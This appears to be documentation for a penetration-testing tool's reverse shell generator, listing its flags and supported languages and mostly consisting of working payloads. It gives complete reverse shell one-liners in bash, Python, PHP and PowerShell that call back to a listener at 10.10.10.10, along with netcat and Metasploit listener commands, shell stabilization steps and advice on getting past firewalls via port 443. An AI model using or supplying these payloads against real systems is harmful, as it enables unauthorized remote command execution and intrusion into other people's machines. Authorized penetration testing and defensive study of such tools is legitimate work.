# Reverse Shell Generator

Generate reverse shell payloads in multiple languages.

## Quick Start

```bash
# Basic bash shell
rb exploit payload shell --lhost 10.10.10.10 --lport 4444

# Python shell (most reliable)
rb exploit payload shell --type python --lhost 10.10.10.10 --lport 4444

# PowerShell for Windows
rb exploit payload shell --type powershell --lhost 10.10.10.10 --lport 443
```

## Command

### shell - Reverse Shell Generator

Generate reverse shell payloads for various languages.

```bash
rb exploit payload shell --lhost <ip> --lport <port> [flags]
```

## Options

```rust
// Shell generation options
struct ShellOptions {
    // Listener host (attacker IP)
    // Required
    lhost: String,

    // Listener port
    // Default: 4444
    lport: u16,

    // Shell type
    // Values: "bash", "python", "perl", "php", "ruby",
    //         "nc", "powershell", "socat", "awk", "java", "node"
    // Default: "bash"
    shell_type: String,

    // Use SSL/TLS encryption (socat only)
    // Default: false
    ssl: bool,
}
```

## Flag Reference

| Flag | Short | Description | Default |
|------|-------|-------------|---------|
| `--lhost` | `-h` | Attacker IP (required) | - |
| `--lport` | `-p` | Listener port | 4444 |
| `--type` | `-t` | Shell language | bash |
| `--ssl` | | SSL encryption (socat) | false |

## Supported Shell Types

### Linux/Unix

| Type | Reliability | Notes |
|------|-------------|-------|
| bash | High | Uses /dev/tcp |
| python | Very High | Most reliable |
| perl | High | Good fallback |
| nc | Medium | Requires netcat |
| socat | High | Supports SSL |
| awk | Low | Stealthy but rare |

### Windows

| Type | Reliability | Notes |
|------|-------------|-------|
| powershell | Very High | Native Windows |
| python | High | If installed |
| nc | Medium | Requires netcat |

### Web Servers

| Type | Use Case | Notes |
|------|----------|-------|
| php | File upload | Web exploitation |
| ruby | Rails apps | Ruby environments |
| java | Java apps | JSP/Servlet |
| node | Node.js apps | JavaScript |

## Examples

### Basic Shells

```bash
# Bash (Linux)
rb exploit payload shell --lhost 10.10.10.10 --lport 4444

# Python (cross-platform, most reliable)
rb exploit payload shell --type python --lhost 10.10.10.10 --lport 4444

# PowerShell (Windows)
rb exploit payload shell --type powershell --lhost 10.10.10.10 --lport 443
```

### Web Exploitation

```bash
# PHP for file upload
rb exploit payload shell --type php --lhost 10.10.10.10 --lport 4444

# Node.js for SSRF/RCE
rb exploit payload shell --type node --lhost 10.10.10.10 --lport 4444
```

### Encrypted Shells

```bash
# Socat with SSL
rb exploit payload shell --type socat --lhost 10.10.10.10 --lport 443 --ssl
```

## Output Examples

### Python Shell Output

```
AUTHORIZED USE ONLY

Reverse Shell Generator - python

  Listener Host: 10.10.10.10
  Listener Port: 4444
  Shell Type:    python

Payload:
================================================================================
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
================================================================================

Start Listener:
  nc -lvnp 4444
  OR
  rb exploit payload listener --port 4444

Shell Stabilization (after connection):
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  Ctrl+Z (background)
  stty raw -echo; fg
  export TERM=xterm
```

### PowerShell Output

```
Reverse Shell Generator - powershell

  Listener Host: 10.10.10.10
  Listener Port: 443
  Shell Type:    powershell

Payload:
================================================================================
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
================================================================================

Start Listener:
  nc -lvnp 443
```

## Shell Payloads Reference

### Bash

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

### Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### PHP

```php
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### PowerShell

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Listener Commands

### shell - Start Listener

```bash
# Basic listener command
rb exploit payload listener --port 4444
```

This outputs multiple listener options:

```
Listener Commands

  Port: 4444

1. Netcat (Traditional):
   nc -lvnp 4444

2. Netcat (OpenBSD):
   nc -lvp 4444

3. Ncat (Nmap):
   ncat -lvnp 4444

4. Socat:
   socat TCP-LISTEN:4444,reuseaddr,fork STDOUT

5. Metasploit:
   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

## Shell Stabilization

After getting a shell, stabilize it:

```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background with Ctrl+Z, then:
stty raw -echo; fg

# Set terminal type
export TERM=xterm

# Fix terminal size
stty rows 50 cols 200
```

## Troubleshooting

### Shell Won't Connect

```bash
# Check listener is running
netstat -tlnp | grep 4444

# Check firewall
iptables -L -n

# Try different port (443 often allowed)
rb exploit payload shell --type python --lhost 10.10.10.10 --lport 443

# Test connectivity
telnet 10.10.10.10 4444
```

### Shell Dies Immediately

```bash
# Use more stable shell
rb exploit payload shell --type python --lhost 10.10.10.10 --lport 4444

# Stabilize immediately after connect
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Next Steps

- [Privilege Escalation](/domains/exploit/01-privesc.md) - Find escalation vectors
- [Lateral Movement](/domains/exploit/03-lateral.md) - Movement techniques
- [Persistence](/domains/exploit/04-persist.md) - Maintain access
